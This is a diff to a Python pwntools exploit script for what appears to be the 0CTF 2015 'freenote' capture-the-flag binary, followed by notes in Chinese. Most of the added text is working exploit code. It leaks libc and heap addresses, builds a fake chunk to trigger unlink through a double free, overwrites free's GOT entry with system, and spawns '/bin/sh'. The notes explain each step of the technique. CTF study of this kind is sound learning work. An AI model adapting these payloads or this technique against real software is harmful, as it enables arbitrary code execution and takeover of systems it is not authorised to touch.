@@ -50,6 +50,81 @@ if __name__ == '__main__':
     leak = p.recvuntil('\n')
     #log.info('heap:' + str(u64(leak[8:-1])))
     print leak[0:-1].encode('hex')
+    
+    delete_note(1)
+    delete_note(0)
+
+    #libc_base = leaklibcaddr - offset          (此处偏移依据libc版本不同，基址页对齐4K,也就是地址后三位为000，如：0x7fabba34b000)
+    #进而再算出system, "/bin/sh" 偏移  或者将"/bin/sh\x00" 写入到heap or bss
+    system_sh_addr = leaklibcaddr - 0x3724a8   
+    print "system_sh_addr: " + hex(system_sh_addr)
+    binsh_addr = leaklibcaddr - 0x23e7f1
+    print "binsh_addr: " + hex(binsh_addr)
+
+    #raw_input()
+
+    ####################leak heap#########################
+
+    notelen=0x10
+
+    new_note("A"*notelen)
+    new_note("B"*notelen)
+    new_note("C"*notelen)
+    new_note("D"*notelen)
+    delete_note(2)
+    delete_note(0)
+
+    new_note("AAAAAAAA")
+    list_note()
+    p.recvuntil("0. AAAAAAAA")
+    leak = p.recvuntil("\n")
+
+    print leak[0:-1].encode('hex')
+    leakheapaddr = u64(leak[0:-1].ljust(8, '\x00'))
+    print hex(leakheapaddr)
+
+    delete_note(0)
+    delete_note(1)
+    delete_note(3)
+
+    ####################unlink exp#########################
+
+    notelen = 0x80
+
+    #new_note("/bin/sh\x00"+"A"*(notelen-8))
+    new_note("A"*notelen)
+    new_note("B"*notelen)
+    new_note("C"*notelen)
+
+    delete_note(2)
+    delete_note(1)
+    delete_note(0)
+
+    fd = leakheapaddr - 0x1808 #notetable
+    bk = fd + 0x8
+
+
+    payload  = ""
+    payload += p64(0x0) + p64(notelen+1) + p64(fd) + p64(bk) + "A" * (notelen - 0x20)
+    payload += p64(notelen) + p64(notelen+0x10) + "A" * notelen
+    payload += p64(0) + p64(notelen+0x11)+ "\x00" * (notelen-0x20)
+
+    new_note(payload)
+
+    delete_note(1)
+
+    free_got = 0x602018
+
+    payload2 = p64(notelen) + p64(1) + p64(0x8) + p64(free_got) + "A"*16 + p64(binsh_addr)
+    payload2 += "A"* (notelen*3-len(payload2)) 
+
+    edit_note(0, payload2)
+    edit_note(0, p64(system_sh_addr))
+
+    delete_note(1)
+
+    p.interactive()
+
 
 泄露libc基址的方法:
 运行脚本程序  python -m pdb myexp.py   (过程中会打印出进程号xxx)
@@ -72,3 +147,30 @@ leaking a heap address is fairly simple though:
 This same technique can be used to leak a libc address (the head of the freelist is in the .bss of the libc). 
 Simply follow the same steps, but now it suffices to allocate chunks 1 and 2 and free the first.
 
+我们通过新建两个note,然后free(0),再new_note("aaaaaaaa"),在new_note时unsorted_bin 双向链表中只有free的note0,当再次申请堆内存时，就会重新获取
+trunk0, "aaaaaaaa"就会覆盖trunk0的fd，list_note()就会泄露trunk0的bk，而bk指向的是main_arena中的unsort_bin 首地址(就是p &main_arena.bins[0]
+地址减去0x10)， 可以算出libc_base的地址，从而确定libc中函数的地址。 
+1. unsorted_bin 双向链表采用的是头部插入的方式，header(unsorted_bin) fd 指向最新插入元素的地址，并且采用FIFO的方式，那么泄露的第一个插入进
+   unsorted_bin的trunk的fd，fd就是unsorted_bin的首地址，从而可以算出libc_base. 如果泄露bk，bk就是第二个插入到unsorted_bin的首地址，利用此方法
+   可以泄露出heap的地址，进而计算出heap_base
+2. 如何我们要unlink的trunk的首地址指针为P，那么我们需要找到一个指针X(满足条件*X = P), 我们需要在note table(形式结构体如下：)
+  Struct note{
+    int flag;
+    int length;
+    char* content;
+  }note;
+ fd = X - 0x18
+ bk = X - 0x10
+ 执行unlink后, X -> X - 0x18 （X的值变成X - 0x18） X指向的地址做任意写操作,就能通过再次覆盖修改X的值,继而使X指向我们想修改的任意空间,
+从而实现对任意地址的任意修改.
+
+通过泄露的libc地址我们可以计算出 system() 函数和 "/bin/sh" 字符串在内存中的地址，通过泄露的堆的地址我们能得到note table的地址。
+然后我们构造一个假的note，利用使用double free的漏洞触发unlink，将note0的位置指向note table的地址。随后我们就可以通过编辑note0
+来编辑note table了。通过编辑note table我们把note0指向 free() 函数在got表中的地址，把note1指向 "/bin/sh" 在内存中的地址。
+然后我们编辑note0把 free() 函数在got表中的地址改为 system() 的地址。最后我们执行delete note1操作。因为我们把note1的地址指向
+了 "/bin/sh" ，所以正常情况下程序会执行 free("/bin/sh") ，但别忘了我们修改了got表中free的地址，所以程序会执行 system("/bin/sh")。
+
+  参考：
+  https://kitctf.de/writeups/0ctf2015/freenote
+  http://rk700.github.io/2015/04/21/0ctf-freenote/
+  http://www.tuicool.com/articles/IfYZri3
